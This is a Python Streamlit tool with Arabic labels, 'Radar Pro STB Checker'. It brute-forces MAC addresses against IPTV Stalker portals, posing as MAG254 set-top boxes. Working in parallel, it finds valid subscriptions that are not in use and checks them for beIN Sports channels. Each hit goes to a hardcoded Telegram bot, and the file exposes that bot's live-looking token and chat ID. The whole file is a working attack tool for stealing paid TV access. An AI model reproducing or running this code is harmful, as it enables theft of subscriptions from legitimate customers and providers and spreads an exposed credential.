import streamlit as st
import requests
import time
import telebot
import random
import re
import json
from datetime import datetime
import pandas as pd
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============ 🔑 بيانات البوت ============
TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
ID = 7638628794
bot = telebot.TeleBot(TOKEN)

# ============ 📺 القنوات المستهدفة ============
CHANNELS_KEYS = {
    "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
    "IARI BEIN SPORTS 8K": ["8K", "IARI"],
    "IARI BEIN SPORTS 4K": ["4K", "IARI"]
}

# ============ 🎨 واجهة احترافية ============
st.set_page_config(page_title="Radar Pro STB Checker", page_icon="📡", layout="wide")

st.markdown("""
<style>
    .main-header { text-align: center; background: linear-gradient(90deg, #0f172a 0%, #1e293b 100%); 
    padding: 2rem; border-radius: 15px; color: white; margin-bottom: 2rem; border: 1px solid #334155; }
    .stButton>button { width: 100%; border-radius: 8px; font-weight: bold; }
</style>
<div class="main-header">
    <h1>📡 Radar Pro STB Checker</h1>
    <p>نظام الفحص المتوازي وتحليل حالة السيرفر والماك</p>
</div>
""", unsafe_allow_html=True)

# ============ ⚙️ الوظائف التقنية ============

def check_server_status(host):
    """التحقق من حالة اتصال السيرفر"""
    try:
        response = requests.get(f"http://{host}/", timeout=5)
        if response.status_code in [200, 403, 404]:
            return "✅ يعمل (Online)"
    except:
        pass
    return "❌ معطل أو محظور (Offline)"

def check_single_mac(host, mac, timeout=7):
    """فحص الماك واستخراج البيانات"""
    try:
        headers = {'User-Agent': 'MAG254', 'Cookie': f'mac={mac}'}
        base_url = f"http://{host}/portal.php"
        
        start = time.time()
        r_prof = requests.get(f"{base_url}?type=stb&action=get_profile&force_stb=1", headers=headers, timeout=timeout)
        latency = (time.time() - start) * 1000
        
        if r_prof.status_code == 200:
            match = re.search(r'"active_cons"\s*:\s*"(\d+)"', r_prof.text)
            active = int(match.group(1)) if match else 1
            
            # استخراج التاريخ
            exp_match = re.search(r'"end_date"\s*:\s*"([^"]+)"', r_prof.text)
            expiry = exp_match.group(1) if exp_match else "غير محدد"
            
            if active == 0:
                # فحص القنوات
                r_ch = requests.get(f"{base_url}?type=itv&action=get_all_channels", headers=headers, timeout=timeout)
                ch_text = r_ch.text.upper()
                found = [n for n, keys in CHANNELS_KEYS.items() if all(k in ch_text for k in keys)]
                
                return {
                    'mac': mac, 'status': 'AVAILABLE', 'latency': round(latency),
                    'active': 0, 'expiry': expiry, 'channels': found
                }
            return {'mac': mac, 'status': 'BUSY', 'active': active, 'expiry': expiry, 'latency': round(latency)}
    except:
        pass
    return {'mac': mac, 'status': 'ERROR'}

# ============ 🖥️ لوحة التحكم ============

if "input_val" not in st.session_state:
    st.session_state["input_val"] = ""

raw_data = st.text_area("📝 الصق البيانات (رابط URL + ماكات عشوائية):", value=st.session_state["input_val"], height=200)

col_ctrl1, col_ctrl2 = st.columns([3, 1])
with col_ctrl1:
    btn_start = st.button("🚀 بدء المسح الشامل", type="primary")
with col_ctrl2:
    if st.button("🗑️ تنظيف الحقول"):
        st.session_state["input_val"] = ""
        st.rerun()

st.divider()

if btn_start:
    if raw_data:
        # استخراج الرابط والماكات
        macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', raw_data.upper())))
        host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', raw_data)
        
        if host_match and macs:
            full_url = host_match.group(0).split('/portal.php')[0].strip('/')
            clean_host = full_url.replace("http://", "").replace("https://", "").split('/')[0]
            
            # فحص حالة السيرفر
            s_status = check_server_status(clean_host)
            st.subheader(f"🌐 السيرفر: {full_url}")
            st.info(f"📊 حالة السيرفر الحالية: {s_status}")

            # إعدادات المسح
            workers = 15
            progress_bar = st.progress(0)
            results = []
            
            with ThreadPoolExecutor(max_workers=workers) as executor:
                futures = {executor.submit(check_single_mac, clean_host, m): m for m in macs}
                
                for i, future in enumerate(as_completed(futures)):
                    res = future.result()
                    if res['status'] == 'AVAILABLE':
                        results.append(res)
                        # إشعار تلغرام الفوري مع URL و MAC
                        msg = (f"🎯 **صيد متاح جديد**\n\n🌐 **السيرفر:** {full_url}\n🖥️ **الماك:** `{res['mac']}`\n"
                               f"📶 **الحالة:** {s_status}\n📅 **ينتهي:** {res['expiry']}\n"
                               f"📺 **القنوات:** {', '.join(res['channels'])}")
                        bot.send_message(ID, msg, parse_mode="Markdown")
                        st.success(f"✅ متاح: {res['mac']}")
                    
                    progress_bar.progress((i + 1) / len(macs))

            # عرض النتائج في جدول
            if results:
                st.divider()
                st.subheader("📊 الماكات الذهبية المكتشفة")
                df = pd.DataFrame(results)
                st.dataframe(df, use_container_width=True)
                
                # خيار التحميل
                csv = df.to_csv(index=False).encode('utf-8')
                st.download_button("📥 تحميل النتائج CSV", csv, "radar_results.csv", "text/csv")
            else:
                st.warning("📭 لم يتم العثور على ماكات فارغة حالياً.")
        else:
            st.error("❌ تأكد من إدخال رابط URL صحيح وقائمة عناوين MAC.")
    else:
        st.warning("⚠️ يرجى إدخال البيانات أولاً.")
